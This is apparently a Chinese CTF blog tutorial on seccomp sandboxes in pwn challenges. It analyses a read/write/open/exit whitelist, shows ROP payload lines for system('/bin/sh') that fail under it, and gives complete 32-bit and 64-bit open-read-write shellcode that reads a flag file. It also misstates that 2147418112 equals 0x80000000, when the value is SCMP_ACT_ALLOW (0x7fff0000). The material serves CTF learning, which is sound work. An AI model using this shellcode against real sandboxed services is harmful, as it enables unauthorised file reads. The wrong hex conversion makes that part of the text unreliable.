---
title: Seccomp 沙箱机制详解
published: 2026-04-14
updated: 2026-04-17
description: 从允许的系统调用、PWN 利用方式到 ORW 思路，整理 Seccomp 沙箱题最常见的判断和应对方法。
tags: [CTFshow, Pwn, Seccomp, Sandbox, ORW]
category: ctfshow
draft: false
---
# Seccomp 沙箱机制详解

## 一、代码分析

```c
v1 = seccomp_init(0);                           // 初始化seccomp
seccomp_rule_add(v1, 2147418112, 0, 0);         // 允许系统调用 0
seccomp_rule_add(v1, 2147418112, 1, 0);         // 允许系统调用 1
seccomp_rule_add(v1, 2147418112, 2, 0);         // 允许系统调用 2
seccomp_rule_add(v1, 2147418112, 60, 0);        // 允许系统调用 60
return seccomp_load(v1);                        // 加载规则
```

## 二、关键参数解析

### 1. 第二个参数：2147418112

这个数字转换为十六进制是 `0x80000000`。

在 seccomp 中，这个动作表示：
```c
SCMP_ACT_ALLOW = 0x7fff0000  // 允许
// 0x80000000 是 SCMP_ACT_ALLOW 的变体或特定libc版本中的值
```

**含义**：**允许**执行这些系统调用。

### 2. 第三个参数：系统调用号

| 数字 | 系统调用名 | 功能 | 常用场景 |
|------|-----------|------|---------|
| **0** | `read` | 从文件描述符读取数据 | 读取输入、读取文件 |
| **1** | `write` | 向文件描述符写入数据 | 打印输出、写入文件 |
| **2** | `open` | 打开文件 | 打开flag文件 |
| **60** | `exit` | 退出进程 | 正常退出 |

## 三、系统调用号对照表（x86-64）

```
0   - read          读取
1   - write         写入
2   - open          打开文件
3   - close         关闭文件
4   - stat          获取文件状态
5   - fstat         获取文件状态
6   - lstat         获取文件状态
7   - poll          轮询
8   - lseek         定位
9   - mmap          内存映射
10  - mprotect      内存保护
11  - munmap        解除映射
...
59  - execve        执行程序  ⛔ 被禁用！
60  - exit          退出       ✅ 允许
...
```

## 四、沙箱限制分析

### ✅ 允许的操作（白名单）

| 系统调用 | 功能 | 利用场景 |
|---------|------|---------|
| read (0) | 读取数据 | 读取flag文件内容 |
| write (1) | 写入数据 | 输出flag到stdout |
| open (2) | 打开文件 | 打开/flag或flag.txt |
| exit (60) | 退出进程 | 正常退出 |

### ⛔ 被禁用的关键操作

| 系统调用 | 功能 | 禁用影响 |
|---------|------|---------|
| **execve (59)** | 执行程序 | **无法执行/bin/sh！** |
| **system** | 执行命令 | 无法调用system函数 |
| fork (57) | 创建进程 | 无法fork |
| clone (56) | 创建线程 | 无法创建新进程 |
| mmap (9) | 内存映射 | 无法动态分配可执行内存 |
| socket (41) | 创建socket | 无法网络连接 |
| connect (42) | 连接 | 无法反弹shell |

## 五、对PWN题目的影响

### 1. 无法使用常规getshell方法

```python
# ❌ 这些方法都会被禁用：

# 方法1：system("/bin/sh") - 失败
payload = pop_rdi + bin_sh + system
# execve被禁用，无法执行shell

# 方法2：one_gadget - 失败
payload = one_gadget_addr
# one_gadget内部调用execve，被禁用

# 方法3：execve系统调用 - 失败
# 直接syscall execve会被seccomp拦截
```

### 2. 必须使用ORW技术

由于只能使用 `open`、`read`、`write`，必须采用**ORW（Open-Read-Write）**方式读取flag：

```python
# ✅ 正确的方法：ORW

# 步骤1：open("flag", 0)
# 步骤2：read(fd, buf, size)  
# 步骤3：write(1, buf, size) 输出到stdout
```

## 六、ORW Shellcode 示例

### 32位 ORW Shellcode

```python
context(arch='i386', os='linux')

shellcode = '''
    // open("flag", 0)
    xor ecx, ecx          // ecx = 0 (flags)
    push ecx              // 字符串结束符
    push 0x67616c66       // "flag"
    mov ebx, esp          // ebx = "flag"指针
    xor eax, eax
    mov al, 5             // eax = 5 (open)
    int 0x80              // 调用open
    
    // read(fd, buf, 100)
    mov ebx, eax          // ebx = fd
    mov ecx, esp          // ecx = buf (栈上)
    xor edx, edx
    mov dl, 100           // edx = 100
    xor eax, eax          // eax = 0 (read)
    int 0x80
    
    // write(1, buf, 100)
    mov edx, eax          // edx = 读取的字节数
    xor ebx, ebx
    mov bl, 1             // ebx = 1 (stdout)
    xor eax, eax
    mov al, 4             // eax = 4 (write)
    int 0x80
'''

payload = asm(shellcode)
```

### 64位 ORW Shellcode

```python
context(arch='amd64', os='linux')

shellcode = '''
    // open("flag", 0)
    xor rdi, rdi
    push rdi
    mov rdi, 0x67616c662f // "/flag"
    push rdi
    mov rdi, rsp
    xor rsi, rsi          // flags = 0
    xor rax, rax
    mov al, 2             // open = 2
    syscall
    
    // read(fd, buf, 100)
    mov rdi, rax          // fd
    mov rsi, rsp          // buf
    xor rdx, rdx
    mov dl, 100           // count
    xor rax, rax          // read = 0
    syscall
    
    // write(1, buf, 100)
    mov rdx, rax          // 读取的字节数
    xor rdi, rdi
    mov dil, 1            // stdout
    mov rax, 1            // write = 1
    syscall
'''

payload = asm(shellcode)
```

## 七、如何判断seccomp限制

### 方法1：运行程序测试

```bash
# 运行程序，尝试执行system
./pwn
$ /bin/sh
# 如果被seccomp拦截，会显示：
# Bad system call (core dumped)
```

### 方法2：使用seccomp-tools

```bash
# 安装seccomp-tools
gem install seccomp-tools

# 分析程序
seccomp-tools dump ./pwn

# 输出示例：
#  line  CODE  JT   JF      K
# =================================
#  0000: 0x20 0x00 0x00 0x00000004  A = arch
#  0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
#  ...
```

### 方法3：IDA/GHidra分析

搜索字符串：
- `seccomp_init`
- `seccomp_rule_add`
- `prctl`（seccomp底层调用）

## 八、总结

| 项目 | 说明 |
|------|------|
**限制机制** | seccomp沙箱
**允许的系统调用** | read(0)、write(1)、open(2)、exit(60)
**禁用的关键调用** | execve(59)、system、fork、socket等
**影响** | 无法getshell，只能ORW读flag
**应对策略** | 编写ORW shellcode，open→read→write

## 九、快速判断流程

```
拿到题目 → 运行测试 → 输入/bin/sh
    ↓
Bad system call? → 是 → seccomp限制
    ↓
IDA找seccomp_init → 确认限制
    ↓
只能用ORW → 编写open-read-write shellcode
```

---

**关键记忆点**：
- `0, 1, 2, 60` = read, write, open, exit
- 没有 `59(execve)` = 无法执行shell
- 必须 ORW 读flag
